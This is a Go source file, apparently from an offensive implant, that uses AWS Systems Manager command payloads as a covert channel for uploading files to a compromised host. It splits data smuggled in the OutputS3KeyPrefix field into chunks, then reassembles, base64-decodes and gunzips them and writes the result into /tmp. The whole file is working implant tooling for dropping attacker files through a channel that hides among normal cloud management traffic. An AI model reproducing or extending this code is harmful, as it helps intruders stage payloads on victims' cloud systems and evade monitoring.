package implantup

import (
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/grines/ssmmm/awsssm"
	"github.com/grines/ssmmm/implant/implantutil"
)

var completeFile []FileParts

type FileParts struct {
	CurrentCount string
	TotalCount   string
	Filename     string
	FileData     string
}

//Recieve each piece of the file split it by colon into a FileParts object.
//We are using the OutputS3KeyPrefix as its the largest field.
func RecieveFile(payload awsssm.SendCommandPayload) {

	s := strings.Split(payload.OutputS3KeyPrefix, ":")

	//Make sure we have a correctly formatted payload
	if len(s) == 4 {

		file := FileParts{
			CurrentCount: s[0],
			TotalCount:   s[1],
			Filename:     s[2],
			FileData:     s[3],
		}

		completeFile = append(completeFile, file)

		CheckFile(file)

	}

}

//Check if we have all of the pieces to the file
func CheckFile(file FileParts) {
	var singleFile []FileParts
	tc, _ := strconv.Atoi(file.TotalCount)

	for _, v := range completeFile {
		if v.Filename == file.Filename {
			singleFile = append(singleFile, v)
			if len(singleFile) == tc {
				SaveFile(singleFile, v.Filename)
				fmt.Println("Uploaded")
			}
		}
	}
}

//Save the file to the /tmp folder
func SaveFile(file []FileParts, filename string) {
	var pieces []string

	for _, v := range file {
		pieces = append(pieces, v.FileData)

	}
	asone := strings.Join(pieces, "")
	decoded := implantutil.Base64Decode(asone)
	b := []byte(decoded)
	actual, err := implantutil.ReadGzFile(b)
	if err != nil {
		return
	}
	d1 := []byte(actual)
	os.WriteFile("/tmp/"+filepath.Base(filename), d1, 0644)
}

//Clear file from []FileParts
func ClearFile() {
	//completeFile = []FileParts{}
}
